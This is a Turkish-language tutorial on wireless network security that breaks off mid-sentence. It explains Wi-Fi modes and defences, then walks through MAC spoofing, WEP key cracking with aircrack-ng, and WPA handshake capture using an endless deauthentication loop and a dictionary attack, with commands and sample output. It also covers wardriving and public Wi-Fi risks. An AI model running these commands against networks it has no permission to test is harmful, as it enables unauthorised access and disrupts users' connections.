### Kablosuz Ağlar Ve Güvenlik

Son yıllarda ADSL bağlantıların her ortama girmesi ve dizüstü bilgisayarlardaki fiyat düşüşü kablosuz ağ kullanımını büyük oranda arttırdı. Yeni alınan ADSL modemlerin çoğunda kablosuz ağ özelliği de birlikte geliyor. Kablosuz ağ kullanımı hem pratik hem de kullanışlı fakat gerekli önlemler alınmazsa güvenlik noktasında biraz sıkıntılıdır. Bu yazıda kablosuz ağlar ve bu ağlarda güvenliği sağlayacak temel bileşenler anlatılmıştır.

Bir konunun güvenliğinin sağlanabilmesi için bazı temel detayların bilinmesi gerekir. Kablosuz ağların güvenliği konusunun anlaşılabilmesi için güvenliği sağlayacak ya da güvenlik açığına sebep olacak bileşenlerin neler olduğuna bir gözatalım:

#### Kablosuz Ağ arabirim çalışma modları

Kablosuz ağ adaptörleri kullandıkları sürücüye ve yapacağı işleve bağlı olarak dört farklı modda çalışabilir. Bunlar: 

* Managed mode
* Master(hostap) mode
* Ad-hoc mode
* Monitor mode

__Master Mod:__ Etraftaki kablosuz ağ istemcilerine hizmet vermek için kullanılan mod. Erişim noktası olarak adlandırılan cihazlarda kablosuz ağ adaptörleri bu modda çalışır.

__Managed Mod:__ Bir erişim noktasına bağlanarak hizmet alan istemcinin bulunduğu mod. 

__Ad-Hoc Mod:__ Arada bir AP olmaksızın kablosuz istemcilerin haberleşmesi için kullanılan mod.

__Monitor Mod:__ Herhangi bir kablosuz ağa bağlanmadan pasif olarak ilgili kanaldaki tüm trafiğin izlenmesine olanak sağlayan mod. Kablosuz ağlarda gücenlik konusunda sık sık kullanılan bir moddur.

##### Promiscious mod ve monitor mod farkı

* Klasik yapılan hata promiscious mod ve monitor modun karıştırılmasıdır. Bu iki moda birbirinden tamamen farklıdır.

* Monitor mod, bir kablosuz ağ arabiriminin herhangi bir ağa bağlanmadan o ağa ait tüm trafiği izleyebilmesine olanak verir. _Promiscious mod_ ise bir ağa bağlanıldığında o ağda _–duruma göre-_ tüm trafiği izleyebilmenizi sağlar.

* Kablosuz ağlarda _Wireshark_ gibi sniffer araçları kullanırken _Promiscious mod_ seçili ise bazen hiç paket yakalayamazsınız. Bu kullandığınız kalbosuz ağ adaptörünün ya da sürücüsünün promiscious mod desteklemediğini gösterir.

#### Yaygın Kablosuz Ağ Yöntemleri

Kablosuz ağlar temelde iki modda çalışır: bunlardan biri _Ad-hoc_ diğeri de _Infrastructure mod_ olarak adlandırılmıştır. Genellikle, kablosuz ağı kullanım amacımıza göre bu iki mod’dan birini seçme durumunda kalırız.

###### Ad-hoc Mode: Bilgisayardan bilgisayara bağlantı Yöntemi

_Ad-hoc_ mod, iki kablosuz ağ cihazının arada başka bir birleştiriciye(AP) ihtiyaç duymadan haberleşebildiği durumdur. Teknik olarak Independed Basic service set olarak da bilinir(IBSS). Ad-hoc bağlantıları genellikle evde kişisel işlerimiz için kullanırız. Mesela, bir evde iki bilgisayar ve birinin internet bağlantısı var, diğer bilgisayarıda internete çıkarmak istersek önümüze iki seçenek çıkıyor: ya iki bilgisayar arasında bir kablo çekerek iki bilgisayarı direk birbirine bağlayacağız ya da bir hub/switch
alarak iki bilgisayarı bu aracı cihazlar ile konuşturacağız.

Oysa bunlardan başka bir seçeneğimiz daha var -tabi eğer her iki bilgisayarda kablosuz ağ adaptörü varsa-. Bu iki cihazın kablosuz ağ adaptörlerini _Ad-hoc_ modda çalışacak şekilde ayarlarsak ve internete çıkan bilgisayarda bağlantı paylaşımı yaparsak iki makinede özgür bir şekilde interneti kullanabilecektir.
Burada makinelerin Linux, Windows ya da Mac olması farketmez. Tanımlanan değerler standartlara uygun olduğu müddetçe her işlemi kolaylıkla yapabiliriz.

Piyasada 20-30 $ dolara bulabileceğiniz USB kablosuz ağ adaptörleri ile ya da kullandığınız dizüstü bilgisayarın kendi sistemi ile kolaylıkla _Ad-hoc_ mod kablosuz ağ kurulabilir.

Kısaca _Ad-hoc_ mod için herhangi bir AP'e gerek duymadan kablosuz ağ cihazlarının birbirleri arasında haberleşmesidir diyebiliriz.

###### Infrastructure mode : Erişim noktası bağlantı yöntemi
￼
_Infrastructure mode_ ortamdaki kablosuz ağ cihazlarının haberleşmesi için arada AP gibi bir cihaza ihtiyaç duyulmasıdır. Ad-hoc moda göre biraz daha karmaşıktır ve özel olarak ayarlamadıysak işletim sistemimiz bu modu kullanacak şekilde yapılandırılmıştır. Teknik olarak “Basic Service Set” olarak da bilinir(BSS). _Infrastructure modda_ kablosuz ağ istemcileri birbirleri ile direkt konuştuklarını düşünürler fakat tüm paketler AP aracılığı ile iletilir. Burada ağa dahil olmayan herhangi bir kablosuz ağ cihazının tüm trafiği izleme riski vardır. Bu sebeple _Infrastructure mod_ kullanırken genellikle iletişim şifrelenir. şifreleme amaçlı olarak WEP ya da WPA gibi protokoller kullanılır. şifreli iletişimde aradaki trafik izlense bile anlaşılmaz olacaktır.

##### Kablosuz Ağlarda Güvenlik önlemleri

Kablosuz ağlardaki en temel güvenlik problemi verilerin havada uçuşmasıdır. Normal kablolu ağlarda switch kullanarak güvenliğimizi fiziksel sağlayabiliyorduk ve switch’e fiziksel olarak bağlı olmayan makinelerden korunmuş oluyorduk. Oysaki kablosuz ağlarda tüm iletişim hava üzerinden kuruluyor ve veriler gelişigüzel ortalıkta dolaşıyor.

##### Kablosuz ağlarda güvenlik sağlama amaçlı alınacak temel önlemler

###### Erişim noktası Öntanımlı Ayarlarının Değiştirilmesi

Kablosuz ağlardaki en büyük risklerden birisi alınan erişim noktası cihazına ait öntanımlı ayarların değiştirilmemesidir. Öntanımlı ayarlar erişim noktası ismi, erişim noktası yönetim konsolunun herkese açık olması, yönetim arabirimine girişte kullanılan parola ve şifreli ağlarda ağın şifresidir. Yapılan araştırmalarda kullanıcıların çoğunun bu ayarları değiştirmediği görülmüştür.

Kablosuz ağların güvenliğine dair yapılması gereken en temel iş öntanımlı ayarların değiştirilmesi olacaktır.

###### Erişim Noktası İsmini görünmez kılma: SSID Saklama

Kablosuz ağlarda erişim noktasının adını(SSID) saklamak alınabilecek ilk temel güvenlik önlemlerinden biridir. Erişim noktaları ortamdaki kablosuz cihazların kendisini bulabilmesi için devamlı anons ederler. Teknik olarak bu anonslara “beacon frame” denir. Güvenlik önlemi olarak bu anonsları yaptırmayabiliriz ve sadece erişim noktasının adını bilen cihazlar kablosuz ağa dahil olabilir. Böylece Windows, Linux da dahil olmak üzere birçok işletim sistemi etraftaki kablosuz ağ cihazlarını ararken bizim cihazımızı göremeyecektir.

SSID saklama her ne kadar bir önlem olsa da teknik kapasitesi belli bir düzeyin üzerindeki insanlar tarafından rahatlıklar öğrenilebilir. Erisim noktasının WEP ya da WPA protokollerini kullanması durumunda bile SSID’lerini şifrelenmeden gönderildiğini düşünürsek ortamdaki kötü niyetli birinin özel araçlar kullanarak bizim erişim noktamızın adını her durumda öğrenebilmesi mümkündür.

###### Erişim Kontrolü

Standart kablosuz ağ güvenlik protokollerinde ağa giriş anahtarını bilen herkes kablosuz ağa dahil olabilir. Kullanıcılarınızdan birinin WEP anahtarını birine vermesi/çaldırması sonucunda WEP kullanarak güvence altına aldığımız kablosuz ağımızda güvenlikten eser kalmayacaktır. Zira herkeste aynı anahtar olduğu için kimin ağa dahil olacağını bilemeyiz. Dolayısı ile bu tip ağlarda 802.1x kullanmadan tam manası ile bir güvenlik sağlanamayacaktır.

###### MAC tabanlı erişim kontrolü

Piyasada yaygın kullanılan erisim noktası(AP) cihazlarında güvenlik amaçlı konulmuş bir özellik de MAC adresine göre ağa dahil olmadır. Burada yapılan kablosuz ağa dahil olmasını istediğimiz cihazların MAC adreslerinin belirlenerek erisim noktasına bildirilmesidir. Böylece tanımlanmamış MAC adresine sahip cihazlar kablosuz ağımıza bağlanamayacaktır. Yine kablosuz ağların doğal çalışma yapısında verilerin havada uçuştuğunu göz önüne alırsak ağa bağlı cihazların MAC adresleri -ağ şifreli dahi olsa- havadan geçecektir, burnu kuvvetli koku alan bir hacker bu paketleri yakalayarak izin verilmiş MAC adreslerini alabilir ve kendi MAC adresini kokladığı MAC adresi ile değiştirebilir.

Linux altında MAC adresi değiştirmek bize bir komut kadar uzaktadır.

```ShellSession
# ifconfig eth1 hw ether 00:10:09:AA.54:09:56
```

Ya da mac-changer ile MAC adresi değişimi yapılabilir.

###### Şifreleme Kullanma

Kablosuz ağlarda trafiğin başkaları tarafından izlenmemesi için alınması gereken temel önlemlerden biri de trafiği şifrelemektir. Kablosuz ağlarda şifreleme WEP(wired equivalent privacy) ve WPA(Wi-Fi Protected Access) olarak adlandırılan iki protokol üzerinden yapılır. Her iki protokol de ek güvenlik önlemleri alınmazsa günümüzde güvenilir kabul edilmez. Internette yapılacak kısa bir arama ile Linux altında uygun bir kablosuz ağ adaptörü kullanılarak tek komutla WEP korumalı ağlara nasıl sızıldığı izlenebilir. Bugüne kadar WEP kullananlara hep WPA’ya geçmeleri ve uzun karmaşık parola seçmeleri
önerilirdi. Zira WPA, WEP’in zayıf kaldığı noktaları güçlendirmek için yazılmış bir protokoldü . Fakat 2008’in son aylarında iki üniversite öğrencisinin yaptığı çalışma pratikte WPA’nın ~15 dakika da kırılabileceğini ispat etmiş oldu. Aslında çalışma WPA’da değil WPA’nın kullandığı TKIP(emporal Key Integrity Protocol) bileşenindeki açıklıktan kaynaklanıyordu. Dolayısı ile WPA ve AES şifreleme kullanarak gerçek manada güvenlik elde etmek mümkün.

WPA2, WPA’nın yerini almıştır. WPA2’nin testleri ve sertifikasyonu Wi-Fi İttifakı tarafından yapılmış olup IEEE 802.11i standartdından da mecburi elemanları uygulamıştır. WPA2, özellikle CCMP(AES bazlı güçlü bir şifreleme modu)’yi zorunlu olarak desteklemektedir. Sertifikasyon Kasım 2004’den 13 Mart 2006’ya kadar gerçekleşmiştir. Aynı zamanda Wi-Fi markasını taşıyan tüm yeni cihazlar için WPA2 sertifikası almak da zorunludur.

__Sonuç olarak;__
* Erişim noktalarının öntanımlı ayarları mutlaka değiştirilmeli
* Şifreleme olmadan güvenlik olmaz
* AP ile İstemci arasındaki MAC adresleri her durumda açık bir şekilde gider
* MAC adreslerini değiştirmek oldukça kolay
* WEP/WPA ile korunmuş ağlar ek güvenlik önlemleri alınmazsa güvenli değildir.

Katmanlı güvenlik anlayışı gereğince yukarıda anlatılan yöntemlerin uygulanması güvenliğinizi bir adım daha arttıracaktır.

#### Kullanılabilir Kablosuz Arabirimlerini Keşfetme

Kablosuz kartımızı Kali sanal makinemize bağlatıktan sonra, `iwconfig` komutunu yazarak sanal makinemizde bulunan kablosuz arabirimlerine bakalım. Bu durumda kartımız _wlan0_ olarak bağlı:

```ShellSession
root@kali:~# iwconfig
wlan0       IEEE 802.11bg  ESSID:off/any
            Mode:Managed   Access Point: Not-Associated    Tx-Power=20 dBm
            Retry  long limit:7   RTS thr:off   Fragment thr:off
            Encryption key:off
            Power Management:off
lo          no wireless extensions. 
eth0        no wireless extensions.
```

##### Erişim Noktalarını Tarama

Şimdi yakınımızda bulunan erişim noktalarını tarayabiliriz. Bu görevi `iwlist wlan0 scan` komutu ile yapacağız:

```ShellSession
root@kali:~# iwlist wlan0 scan
    Cell 02 - Address: 00:23:69:F5:B4:2Bu
                Channel:6
                Frequency:2.437 GHz (Channel 6)
                Quality=47/70 Signal level=-63 dBm
                Encryption key:off
                ESSID:"linksys"
                Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                          9 Mb/s; 14 Mb/s; 18 Mb/s
                Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                Mode:Master
--snip--
```

Bu tarama sonucunda, saldırımız için lazım olan nerdeyse tüm sonuçları elde edebiliyoruz. Elimizdde MAC adresi var, yayın olduğu kanalı biliyoruz, şifreleme kullanmadığını görüyoruz ve bunun SSID'di var.

#### Monitor mode

Devam etmeden önce, kartımızı _monitor moduna_ geçirelim. Wireshark'ta olam _promiscuous mode_ gibi, monitor modu bize kablosuz kartımıza yönelik kablosuz trafiği görmemizi sağlar. Kartımızı monitor moda atmak için Aircrack-ng kablosuz değerlendirme paketinin parçası olan _Airmon-ng_ scriptini kullanacağız. İlk önce, `airmon-ng check` ile monitor modunda engel olacak herhangi bir sürecin olup olmadığını kontrol ediyoruz.

```ShellSession
root@kali:~# airmon-ng check
Found 2 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working 
after a short period of time, you may want to kill (some of) them! 
-e
PID     Name
2714    NetworkManager
5664    wpa_supplicant
```

Gördüğümüz gibi, Airmon engel olabilecek iki tane süreci bulmuş oldu. Bunların tümünü yok etmek için `airmon-ng check kill` komutu kullanıyoruz:

```ShellSession
root@kali:~# airmon-ng check kill
Found 2 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working 
after a short period of time, you may want to kill (some of) them! 
-e
PID     Name
2714    NetworkManager
5664    wpa_supplicant
Killing all those processes...
```

Şimdi `airmon-ng start wlan0` komutunu çalıştırarak monitor moduna alalım. Bu bize ait olmayan paketleri yakalamamızı sağlar. Airmon-ng yeni _mon0_ kablosuz arabirimini oluşturuyor.

```ShellSession
root@kali:~# airmon-ng start wlan0
Interface       Chipset             Driver
wlan0           Realtek RTL8187L    rtl8187 - [phy0]
                (monitor mode enabled on mon0)
```

#### Paketleri Yakalama

Aircrack-ng takımında bulunan Airodump-ng aracı yardımıyla kablosuz ağdaki paketleri yakalayabilir ve kaydedebiliriz. Aşağıda Airodump-ng ile _mon0_ monitor modunda çalıştırıyoruz:

```ShellSession
root@kali:~# airodump-ng mon0 --channel 6 
CH 6 ][ Elapsed: 28 s ][ 2015-05-19 20:08

BSSID               PWR  Beacons  #Data, #/s  CH  MB   ENC   CIPHER AUTH ESSID 
00:23:69:F5:B4:2B   -30  53       2       0    6  54 . OPNv             linksys

BSSID               STATION               PWR   Rate    Lost    Frames   Probe
00:23:69:F5:B4:2B   70:56:81:B2:F0:53     -21    0      -54      42       19
```

#### Aircrack-ng ile WEP Anahtarı Kırma

WEP anahtarlarını kırmak için birkaç yöntem bulunmaktadır, bunlar: sahte kimlik atağı (fake authentication), parçalanma atağı (fragmentation), chochop atağı, caffè latte atağı ve PTW atağı. Şimdi sahte kimlik atağı nasıl yapılır ona bakalım. 

İlk önce Aircrack-ng'nin aracı olan Airodump-ng ile toplayabileceğimiz bilgilere bakalım. Öncelikle Airodump-ng aracına kablosuz arayüzünü _mon0_ monitor moduna almasını ve `-w` ile tüm paketleri dosyaya kaydetmesini söylüyoruz.

```ShellSession
root@kali:~# airodump-ng -w book mon0 --channel 6 
CH 6 ][ Elapsed: 20 s ][ 2015-03-06 19:08
BSSID               PWR  Beacons  #Data, #/s CH  MB   ENC   CIPHER AUTH ESSID
00:23:69:F5:B4:2B   -53      22      6    0   6  54 . WEP   WEP         linksys
BSSID               STATION             PWR   Rate    Lost    Frames   Probe
00:23:69:F5:B4:2B   70:56:81:B2:F0:53   -26   54-54      0         6
```

Bu tarama sonucunda WEP şifresini kırabilmemiz için tüm bilgileri elde etmiş oluyoruz. Elimizde BSSID, kablosuz kanalı, şifreleme algoritması ve SSID var. Bu bilgileri WEP kırmamız için lazım olan paketleri toplamak için kullanacağız. Aşağıdaki bilgisayarınıza göre değişir, ama başlıca:
* __Base Station MAC Adress:__ 00:23:69:F5:B4:2B
* __SSID:__ linksys
* __Channel:__ 6

##### Paket Enjekte Etme

Aşağıda sahte kimlik doğrulama ile paket enjektlemeyi göstermekte:
* `-1` ile Aireplay-ng aracına sahte kimlik kullanmasını söylüyoruz
* `0` yeniden iletim zamanı
* `-e` SSID; bu durumda _linksys_
* `-a` giriş yapmak istediğimiz erişim noktasının MAC adresi
* `-h` kartımızın MAC adresi (cihazın üstünde bulunur)
* `mon0` sahte kimlik doğrulamada kullanılacak arayüzü

Aireplay-ng sorgusunu gönderdikten sonra, doğrulamanın başarı olduğna dair _Association successful:-)_ mesajını alırız.

```ShellSession
root@kali:~# aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0 
20:02:56 Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6
20:02:56 Sending Authentication Request (Open System) [ACK] 20:02:56 Authentication successful
20:02:56 Sending Association Request [ACK]
20:02:56 Association successful :-) (AID: 1)
```

##### Anahtar Kırma

64-bit WEP anahtarını kırabilmemiz için 250.000 IV toplamamız gerekmektedir. Paketleri elde ettikten sonra, Aircrack-ng programına topladığımız IV'leri doğru WEP anahtarına çevirmesini söyleriz. 

```ShellSession
root@kali:~# aircrack-ng -b 00:23:69:F5:B4:2B book*.cap
Opening book-01.cap
Attack will be restarted every 5000 captured ivs. 
Starting PTW attack with 239400 ivs.
KEY FOUND! [ 2C:85:8B:B6:31 ]
Decrypted correctly: 100%
```

#### WPA/WPA2 Anahtarını Kırma

WPA şifre kırma işlemine geçmeden önce biraz size el sıkışmasından (handshake) olayından bahsetmem gerekir. WPA korumalı ağlarda istemci ve AP (Access point=erişim noktası) her oturum için PTK (Pairwise Transient Key) adı verilen bir anahtar oluşturup aralarındaki tüm trafiği bu anahtar ile şifreler. PTK, SSID ANounce (AP’den gelen bir kerelik rastgele bir sayı), SNounce (istemciden gelen bir kerelik rastgele bir sayı), AP MAC adresi, istemci MAC adresi ve ağ parolası kullanılarak oluşturulur. WPA/WPA2 kullanılan bir ağın parolası bilinse bile bir istemcinin trafiğini deşifre etmek için oturumun başlangıcındaki el sıkışmaya ihtiyaç duyulmasının sebebi de budur.

İşlemlere geçmeden önce kullanabileceğimiz bazı programlar şu şekildedir:
* __airodump:__ 802.11 için Paket Yakalama
* __aireplay:__ 802.11 için Paket Enjeksiyonu
* __aircrack:__ static WEP ve WPA Anahtar Kırma

İlk önce sistemimizin ağ kartını gördüğüne emin olalım. `iwconfig` komutu size kartınızın durumunu gösterecektir.

![wpa1]

Bizim ağ kartımız ekranda wlan2 olarak görülüyor. Buna dikkat edilmesi gerekir. 

Devam etmek için, ağ kartının monitor modu desteklemesi lazım. Bunun için airmon kullanılabilir. Komut ise `# airmon-ng start wlan2` gibidir.

![wpa2]

Bu aşamada handshake yakalama adına ilk adımımızı atalım.

```ShellSession
# airodump-ng --encrypt wpa mon0
```

![wpa3]

Şekilde görüldüğü gibi kendimize ait olan ykarakul essid'sine sahip olan ağın şifresini kırmaya çalışacağız. Handshake yakalamak için aşağıdaki komut kullanılabilir.

```ShellSession
# airodump-ng -w ykarakul --encrypt wpa -c 1 --bssid BA:B4:2E:EE:E0:8A mon0
```

![wpa4]

Ağa bağlı bir istemciyi yakalamak için bir süre beklemek gerekebilir.

![wpa5]

Hedef ağımıza bağlı bir bilgisayarın bilgisini aldıktan sonra aşağıdaki komutla handshake yakalanabilir.

```ShellSession
# aireplay-ng -0 0 -a (bssid) -c (station) mon0
```

> Not: -0 0 ifadeleri hedef ağdaki bağlı olan client' a ağdan düşmesi için sonsuz bir döngü sağlar.

![wpa6]

Yukarıdaki şekilde görüldüğü gibi hedefteki ağa bağlı olan bilgisayarı ağdan düşürüp tekrar bağlanması beklenmelidir. Bağlandıktan sonra handshake yakalama olayımız gerçekleşmiş olacaktır.

![wpa7]

Son adımda sözlük saldırısı ile parolanın belirlenmesi gerekmektedir. Bunun için aircrack aracı kullanılabilir.

```ShellSession
# aircrack-ng -w /root/Desktop/wifi passwd.txt ykarakul-01.cap
```

> Burada -w parametresi ile kullanılacak sözlük belirtilmektedir.

Kullanılan sözlüğün büyüklüğüne göre belli bir süre beklemek gerekmektedir. Bu süre kullanılan sözlüğün kapsamına ve bilgisayarın donanımsal özelliklerine bağlıdır.

![wpa8]

[KAYNAK]

[wpa1]: ../resim/ataklar/wpa/1.jpg
[wpa2]: ../resim/ataklar/wpa/2.jpg
[wpa3]: ../resim/ataklar/wpa/3.jpg
[wpa4]: ../resim/ataklar/wpa/4.jpg
[wpa5]: ../resim/ataklar/wpa/5.jpg
[wpa6]: ../resim/ataklar/wpa/6.jpg
[wpa7]: ../resim/ataklar/wpa/7.jpg
[wpa8]: ../resim/ataklar/wpa/8.jpg
[KAYNAK]: http://www.agguvenligi.net/2014/06/wifi-wpa-wpa2-parola-kirma.html


#### Kablosuz Ağlarda Keşif
Kablosuz ağlarda keşif yakın çevrede bulunan erişim noktalarının tespitidir. İşi abartıp WLAN araçlarını arabalarına alarak ya da yaya olarak yol boyunca etrafta bulunan kablosuz ağları keşfetmeye yönelik çalışmalara Wardriving, erişim noktalarının özelliklerine göre(şifreleme desteği var mı? Hangi kanalda çalışıyor vs) bulundukları yerlere çeşitli işaretlerin çizilmesine ise WarChalking deniyor.
War driving için çeşitli programlar kullanılabilir fakat bunlardan en önemlileri ve iş yapar durumda olanları Windows sistemler için Netstumbler , Linux sistemler için Kismet’dir. Kismet aynı zamanda Windows işletim sisteminde monitor mode destekleyen kablosuz ağ arabirimleri ile de çalışabilmektedir.
Kablosuz ağlarda keşif, Pasif ve aktif olmak üzere ikiye ayrılır. Adından da anlaşılacağı gibi aktif keşiflerde keşif yapan kendisini belirtir ve aktif cihazları aradığını anons eder. Pasif keşif türünde ise tam tersi bir durum söz konusudur. Pasif keşif gerçekleştiren cihaz kesinlikle ortama herhangi birşey anons etmez, sadece ortamdaki anonsları dinleyerek aktif ama gizli cihazları belirlemeye çalışır.
Aktif keşif araçlarına en iyi örnek NetStumbler verilebilir. ücretsiz olarak kullanılabilen Netstumbler çalıştırıldığında kapsama alanında anons yapan tüm aktif cihazları bularak bunları raporlar.
Netstumblerin çalışması ya da bir erisim noktasını keşfetmesi için erisim noktasının kendisini anons etmesi lazımdır. Yani basit güvenlik önlemi olarak aldığımız SSID saklama işlemi Netstumbler’i şaşırtacaktır.
Pasif keşif aracı olarak kullanılabilen Kismet ise Netstumbler’a göre oldukça fazla özellik içerir ve kötü niyetli birinin elinde tam donanımlı gizli bir silaha dönüşebilir.
Kismet, kablosuz ağ adaptörlerine özel bir modda çalıştırarak(monitor mode) etrafta olan biteni izler ve kaydeder. Böylece bulunduğu ortamdaki tüm trafiği görerek aktif, pasif erişim noktası cihazlarını tüm özellikleri ile birlikte belirler. Sadece erişim noktası cihazlarını belirlemekle kalmaz, bu cihazlara bağlı tüm istemci cihazları ve özeliklerini de belirleyebilir daha da ötesinde şifreleme kullanılmıyorsa tüm trafiği dinler. Yeteri kadar korkutucu değil mi? şirket ağınızda kullandığınız makinelerin IP bilgileri vs yabancı ellere gitmesini ister miydiniz?
Kablosuz Ağları Dinleme
Kablosuz ağlarda veriler havada uçuştuğu için dinleme yapmak kablolu ağlara göre daha kolaydır. Amaca uygun kullanılan bir dinleme aracı ile bir kablosuz ağdaki trafik ağa dahil olmadan rahatlıkla izlenebilir. Linux sistemlerde kablosuz ağ trafiği dinlemek için Kismet adlı program tercih edilir.
Kismet, monitoring (rfmon) mod destekleyen kablosuz ağ arabirimleri için düşünülmüş 802.11b, 802.11a ve 802.11g protokolleri ile uyumlu kablosuz ağlarda pasif dinleme yapmaya yarayan bir araçtır. Aynı zamanda kablosuz ağlar için pasif keşif aracı olarak ve basit manada saldırı tespit sistemi olarak da kullanılabilir.
Kismet ile dinleme yapılırken etraftaki erişim noktaları ya da istemciler rahatsız edilmez. Tamamen pasif modda bir dinleme yapıldığı için kablosuz ağları korumaya yönelik bazı saldırı tespit sistemleri kolaylıkla aldatılabilir. özellikle şifresiz bir iletişim yöntemi tercih edilmişse Kismet bu noktada kablosuz ağdaki tüm herşeyi görebilir.
Kismet ve ek bir iki araç kullanılarak MAC adres tabanlı güvenlik önlemi alınmış kablosuz ağlara kolaylıkla giriş yapılabilir.
￼
Kismet aynı zamanda kablosuz ağlarda izinsiz giriş tespiti içinde kullanılabilir. Ağa erişim izni olmayıp da giriş deneyiminde bulunan kullanıcılar Kismet tarafından rahatlıkla belirlenerek raporlanacaktır.
Halka Açık Kablosuz Ağlardaki Tehlikeler
Kablosuz ağların belki de en işe yarar olduğu durumlar halka açık olanlarıdır. Hemen hemen tüm büyük alışveriş merkezlerinde, lokanta ve kafelerde bu tip ağlara rastlayabiliriz. Bazıları erişim için kullanıcı adı / parola istese de yukarıda anlattığım yöntemler kullanılarak bu tip ağlar rahatlıkla kandırılabilir. Gelelim bu tip ağlardaki risklere;
öncelikle aynı erişim noktasına bağlı tüm istemcilerin trafiği şifrelenmemiş bir şekilde havada dolaşacaktır. Bunun içinde MSN görüşmeleriniz, e-postalarınız ve ziyaret ettiğiniz siteler de dahil. Ortama dahil olan birisi basit MITM atakları ile tüm trafiği üzerinden geçirip içeriğini inceleyebilir, ötesinde değiştirebilir.
Başka kimlikte biraz daha paranoyak bir saldırgan gelip ağa dahil olmadan yine tüm trafiği monitor modda izleyebilir hatta eğer bu ortamda Hotmail, Yahoo, Gmail ya da https kullanan sistemlerinize erişiyorsanız saldırgan da kişisel giriş parolanızı bilmeden ilgili sitelerin size gönderdiği cookieleri çalarak aynı sistemlere erişebilir.
Diğer bir tehlike de saldırganın trafik izleme için zahmete girmeden ortamda bulunan erişim noktalarından birinin ismini taklit ederek sahte erişim noktası oluşturmasıdır. Böylece bazı kullanıcılar aslıyla ayni isme sahip belki daha iyi çeken sahte erişim noktasına bağlanacak ve buradan işlemlerini yapacaktır. Bu da bir saldırgan için ağına bağlanan tüm istemciler üzerinde mutlak hakimiyet kurması manasına gelir.
Kısacası halka açık kablosuz ağlarda internet kullanmak buzda dansa benzer. Dolayısı ile dikkatli olmak ve güvenli sörf için uygun araçlar kullanmak gerekir. Bu tip ağlarda internete girmeniz gerekiyorsa ya VPN üzerinden ya da TOR benzeri şifreli iletişim sağlayan networkler üzerinden girmeniz trafiğinizin başkaları tarafından izlenmesini önleyecektir.
Kablosuz Ağ Güvenlik Testleri için Ortam oluşturma
Kablosuz Ağlarda güvenlik konusu pratiği zor olan bir konudur. Bunun temelde iki sebebi vardır. Birincisi kablosuz ağ adaptörleri sürücü eksikliğinden genelde Windows altında test yapacak fonksiyonlara sahip değildir. Bu gibi testler için Linux kullanılması çok daha pratik olacaktır. Diğer bir konu da başkalarının kablosuz ağları üzerinden yapılacak testler etik olmayacağı için kendi kablosuz ağ ortamınızda çalışmalar yapmanız gerektiğidir. Eğer kullanılan Erişim Noktası(Access Point) paylaşımlı ise yapacağınız testlerden diğer kullanıcılar etkilenecektir.
Bu durumda son çare olarak yeni bir donanım almak kalıyor. Diğer bir yöntem de bir adet USB üzerinden çalışan kablosuz ağ adaptorü alıp Vmware içerisinden bu adaptörü kullanmaktır. Böylece hem mobil bir AP’e sahip olacaksanız hem de kablosuz ağlarda güvenlik testi yaparken Windows’un kısıtlayıcı özelliklerine takılmadan Linux üzerinden istediğiniz işlemleri yapabileceksiniz. Böylece istediğinizde sanal bir AP’ye istediğinizde de Linux altında test yapmak için kullanabileceğiniz kablosuz bir ağ adaptörüne ulaşmış olacaksınız.
Vmware ile Kablosuz Ağ adaptörlerini Kullanma
Gercek isletim sisteminizde kullandiginiz wireless kartlari Vmware altinda da ayni ozelliklerde kullanmak ne yazik ki mumkun olmuyor. Vmware’den arabirim modunu bridge , nat yapılarak wifi kartınızın yararlandığı baglantı Vmware makineye saglnabilir fakat bu vmware uzerinde wireless bir
kart olarak algilanmaz. Siradan bir ethernet karti gibi Vmware’in kendi suruculerini kullanarak islem yapılır.
Bu durumda Wireless aglara baglanip analiz yapma imkanımız yok. USB bir wifi kartı alıp bunu Vmware’e tanıtarak kullanacaksınız. (Gercek sisteminizin Windows, Vmware’deki sisteminiz Linux ise ) USB wireless kartinizi Vmware altinda gercek ozellikleri kullanabilmek icin Vmware surumu 6.x , Vmware player kullaniyorsaniz guncel surumu olmali. Bundan sonrasi Vmware’in menulerinden
usb cihazi Vmware’e wireless kart olarak tanıtmak ve sürücünün sağladığı wireless ozelliklerini kullanmaya kalıyor.
Not:Vmware’in kullanacağı usb wireless kartı gerçek işletim sisteminin taniması gerekmez.
Vmware’de usb wireless kartini aktif etme
￼
￼Türkiye’de Kablosuz Ağ Kullanımı Ve Güvenlik Araştırması
Yaklaşık bir ay önce Türkiye’de kablosuz ağların güvenlik açısından durumunu incelemek için bir çalışma başlattık. Bu çalışma kablosuz ağ kullanımında kullanıcıların güvenlik açısından ne durumda olduğunu belirlemek. çıkan sonuçlar net durumu tam olarak yansıtmasa da Türkiye’deki kablosuz ağ kullanıcılarının ortalama durumunu gösterir nitelikte.
çalışmanın şifreli ağ kullanımı ile ilgili sonuçları: